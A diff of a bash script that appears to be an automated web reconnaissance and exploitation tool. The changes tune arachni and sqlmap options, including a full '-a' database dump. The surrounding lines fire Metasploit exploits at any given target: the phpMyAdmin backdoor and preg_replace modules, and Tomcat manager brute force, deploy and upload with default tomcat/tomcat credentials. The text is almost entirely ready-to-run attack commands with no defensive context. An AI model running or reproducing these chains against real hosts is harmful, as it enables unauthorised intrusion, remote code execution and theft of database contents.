@@ -433,8 +433,8 @@ else
 	dirb http://$TARGET
 	wpscan --url http://$TARGET --batch
 	python $CMSMAP -t http://$TARGET
-	arachni http://$TARGET --output-only-positives --scope-include-subdomains
-	sqlmap -u "http://$TARGET" --batch --crawl=2 -f
+	arachni http://$TARGET --output-only-positives
+	sqlmap -u "http://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a
 	msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
 fi
 
@@ -568,8 +568,8 @@ else
 	dirb http://$TARGET
 	wpscan --url https://$TARGET --batch
 	python $CMSMAP -t https://$TARGET
-	arachni https://$TARGET --output-only-positives --scope-include-subdomains
-	sqlmap -u "https://$TARGET" --batch --crawl=2 -f
+	arachni https://$TARGET --output-only-positives
+	sqlmap -u "https://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a
 	msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 443; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
 fi
 
@@ -719,7 +719,7 @@ else
 	./massbleed $TARGET port 8000
 	cd ..
 	nikto -h http://$TARGET:8000 
-	arachni http://$TARGET:8000 --output-only-positives --scope-include-subdomains
+	arachni http://$TARGET:8000 --output-only-positives
 fi
 
 if [ -z "$port_8100" ]
@@ -737,7 +737,7 @@ else
 	./massbleed $TARGET port 8100
 	cd ..
 	nikto -h http://$TARGET:8100 
-	arachni http://$TARGET:8100 --output-only-positives --scope-include-subdomains
+	arachni http://$TARGET:8100 --output-only-positives
 fi
 
 if [ -z "$port_8080" ]
@@ -756,7 +756,7 @@ else
 	cd ..
 	nikto -h http://$TARGET:8080 
 	nmap -p 8080 --script=*proxy* $TARGET
-	arachni http://$TARGET:8080 --output-only-positives --scope-include-subdomains
+	arachni http://$TARGET:8080 --output-only-positives
 	msfconsole -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8080; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
 fi
 
@@ -776,7 +776,7 @@ else
 	cd ..
 	nikto -h http://$TARGET:8180 
 	nmap -p 8180 --script=*proxy* $TARGET
-	arachni http://$TARGET:8180 --output-only-positives --scope-include-subdomains
+	arachni http://$TARGET:8180 --output-only-positives
 	msfconsole -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8180; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
 fi
 
@@ -796,7 +796,7 @@ else
 	cd ..
 	nikto -h https://$TARGET:8443 
 	nmap -p 8443 --script=*proxy* $TARGET
-	arachni https://$TARGET:8443 --output-only-positives --scope-include-subdomains
+	arachni https://$TARGET:8443 --output-only-positives
 fi
 
 if [ -z "$port_10000" ]
